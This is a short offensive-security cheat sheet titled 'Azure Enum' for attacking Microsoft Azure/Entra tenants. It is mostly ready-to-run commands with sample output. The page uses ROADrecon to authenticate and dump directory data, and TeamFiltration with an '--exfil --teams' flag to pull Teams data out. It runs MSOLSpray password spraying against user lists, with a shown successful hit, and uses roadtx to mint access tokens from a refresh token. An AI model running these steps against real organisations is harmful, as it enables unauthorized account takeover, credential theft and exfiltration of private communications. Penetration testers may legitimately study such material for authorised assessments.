---
title: "Azure Enum"
date: 2025-02-21
tags: ["Cloud", "Azure", "Password Spraying", "Enumeration", "Microsoft", "Windows", "Reconnaissance"]
---

### Recon

{{< tab set1 tab1 >}}ROADTools{{< /tab >}}
{{< tab set1 tab2 >}}TeamFiltration{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Authenticate

```console
roadrecon auth -u '<USER>' -p '<PASSWORD>'
```

```console {class="sample-code"}
┌──(venv)─(kali㉿kali)-[~]
└─$ roadrecon auth -u 'apple.seed@example.com' -p 'Test1234'
Tokens were written to .roadtools_auth
```

#### 2. Info Gathering

```console
roadrecon gather
```

```console {class="sample-code"}
┌──(venv)─(kali㉿kali)-[~]
└─$ roadrecon gather                                                       
Starting data gathering phase 1 of 2 (collecting objects)
Starting data gathering phase 2 of 2 (collecting properties and relationships)
ROADrecon gather executed in 12.27 seconds and issued 1152 HTTP requests.
```

#### 3. Explore the Data

```console
roadrecon gui
```

```console {class="sample-code"}
┌──(venv)─(kali㉿kali)-[~]
└─$ roadrecon gui   
 * Serving Flask app 'roadtools.roadrecon.server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
```

<small>*Ref: [ROADTools](https://github.com/dirkjanm/ROADtools)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Data Exfiltration

```console
./TeamFiltration --roadtools .roadtools_auth --exfil --teams --outpath <OUTPUT_PATH>
```

<small>*Ref: [TeamFiltration](https://github.com/Flangvik/TeamFiltration)*</small>

{{< /tabcontent >}}

---

### Password Spraying

> <strong>BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!</strong>

{{< tab set2 tab1 >}}MSOLSpray{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Import Module

```console
Import-Module MSOLSpray.ps1
```

#### 2. Run

```console
Invoke-MSOLSpray -UserList <USERS_FILE> -Password
```

```console {class="sample-code"}
┌──(kali㉿kali)-[/home/kali/Desktop/MSOLSpray]
└─PS> Invoke-MSOLSpray -UserList .\users.txt -Password Test1234                                                                                                                                         
[*] There are 10 total users to spray.
[*] Now spraying Microsoft Online.                                                                                                                                                                                  
[*] Current date and time: 02/20/2025 14:48:11                                                                                                                                                                      
[*] SUCCESS! apple.seed@example.com : Test1234
```

<small>*Ref: [MSOLSpray](https://github.com/dafthack/MSOLSpray)*</small>

{{< /tabcontent >}}

---

### Generate Token with Refresh Token

{{< tab set3 tab1 >}}ROADTools{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
roadtx gettokens --refresh-token '<SECRET>' -c '<CLIENT_ID>'
```

```console {class="sample-code"}
┌──(venv)─(kali㉿kali)-[~]
└─$ roadtx gettokens --refresh-token '1.Aa8AA...[SNIP]...zt4WQ' -c '04b07...[SNIP]...f7b46'
Requesting token for resource https://graph.windows.net
Tokens were written to .roadtools_auth
```

<small>*Ref: [ROADTools](https://github.com/dirkjanm/ROADtools)*</small>

{{< /tabcontent >}}
